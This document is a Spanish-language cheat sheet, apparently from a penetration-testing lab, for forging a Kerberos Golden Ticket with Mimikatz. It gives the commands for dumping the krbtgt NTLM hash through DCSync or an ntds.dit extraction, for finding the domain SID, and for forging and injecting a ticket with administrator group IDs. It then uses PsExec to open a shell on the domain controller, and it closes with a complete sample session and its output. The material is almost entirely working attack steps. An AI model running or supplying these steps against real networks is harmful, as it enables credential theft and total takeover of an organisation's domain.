## 🟡 Golden Ticket – Cheatsheet

### 🎯 Objetivo:

Falsificar un TGT (Ticket Granting Ticket) válido usando Mimikatz para obtener acceso total al dominio.

---

### 🧩 Requisitos:

| Elemento                 | Descripción                           | Cómo obtenerlo                   |
| ------------------------ | ------------------------------------- | -------------------------------- |
| 🟡 NTLM hash de `krbtgt` | Clave maestra que firma los TGT       | `DCSync` o volcado de `ntds.dit` |
| 🟡 SID del dominio       | Identificador único del dominio       | `whoami /user` o `Get-ADDomain`  |
| 🟡 Nombre de usuario     | Usuario que representará el TGT falso | Cualquiera, real o inventado     |
| 🟡 UserID (opcional)     | 500 para Administrator                | Fijo o inventado                 |
| 🟡 Group IDs (opcional)  | 512 (Domain Admins), etc.             | Fijos (ver tabla abajo)          |

---

### 📤 Obtener el hash NTLM de `krbtgt`

#### ✅ Si tenemos privilegios de DCSync:

```powershell
# PowerView
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.com /user:krbtgt"'
```

#### ✅ Si tenemos `ntds.dit` + `SYSTEM`:

```bash
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL > output.txt
# Buscar línea con krbtgt:<RID>:<LM>:<NTLM>
```

---

### 📤 Obtener el SID del dominio

#### Desde PowerShell:

```powershell
Get-ADDomain | Select-Object -ExpandProperty DomainSID
```

#### O desde terminal:

```cmd
whoami /user
# Elimina el RID del usuario al final del SID
```

### 🛠️ Crear y cargar el Golden Ticket (Mimikatz)

```mimikatz
privilege::debug
kerberos::purge

kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-XXXXXX /krbtgt:<hash NTLM> /id:500 /groups:512 513 519 /ptt
```

> `- /ptt` carga el ticket directamente en memoria

### 🔪 Verificar el ticket cargado

```mimikatz
kerberos::list
```

### 🔄 Usar el Golden Ticket

Ejecuta comandos que requieran autenticación Kerberos, por ejemplo:

```cmd
PsExec.exe \\dc1 cmd.exe
# o
dir \\dc1\C$
```

### 📞 Grupos comunes para /groups:

| RID | Grupo               |
| --- | ------------------- |
| 512 | Domain Admins       |
| 513 | Domain Users        |
| 514 | Guests              |
| 515 | Backup Operators    |
| 518 | Schema Admins       |
| 519 | Enterprise Admins   |
| 520 | Group Policy Admins |

### Ejemplo Completo

```mimikatz
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 4/28/2025 12:17:42 PM ; 4/26/2035 12:17:42 PM ; 4/26/2035 12:17:42 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF60489B800



##### On the new spawned terminal, do this:
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
DC1
```
